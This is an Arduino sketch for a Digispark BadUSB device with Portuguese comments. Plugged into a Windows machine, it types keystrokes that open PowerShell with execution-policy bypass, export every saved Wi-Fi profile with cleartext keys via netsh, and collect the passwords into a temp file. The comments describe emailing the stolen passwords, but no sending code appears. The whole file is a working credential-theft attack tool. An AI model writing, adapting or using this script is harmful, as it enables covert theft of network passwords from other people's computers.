#include "DigiKeyboardPtBr.h"

void setup() {
}

// Edite o endereço de e-mail e a senha para enviar a senha Wi-Fi extraída
char modeCommand[] = "powershell -nop -exec bypass";
char separatorCommand[] = "read-host";
char emailAddressPrompt[] = "Digite o endereço de e-mail para eviar as informações extraídas da senha do Wi-Fi: ";
char emailAddress[100];
char passwordPrompt[] = "Digite a senha do endereço de email: ";
char password[100];

void loop() {
  // Abre uma Janela do PowerShell
  DigiKeyboardPtBr.sendKeyStroke(0);
  DigiKeyboardPtBr.delay(500);
  DigiKeyboardPtBr.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboardPtBr.delay(500);
  DigiKeyboardPtBr.println(modeCommand);
  DigiKeyboardPtBr.delay(500);
  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
  DigiKeyboardPtBr.delay(500);

  // Extrair informações da senha Wi-Fi
  DigiKeyboardPtBr.println("cd $env:temp");
  DigiKeyboardPtBr.delay(1000);
  DigiKeyboardPtBr.println("netsh wlan export profile key=clear");
  DigiKeyboardPtBr.delay(1000);
  DigiKeyboardPtBr.println("powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > temp.csv");
  DigiKeyboardPtBr.delay(1000);
  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
  DigiKeyboardPtBr.delay(5000);
}
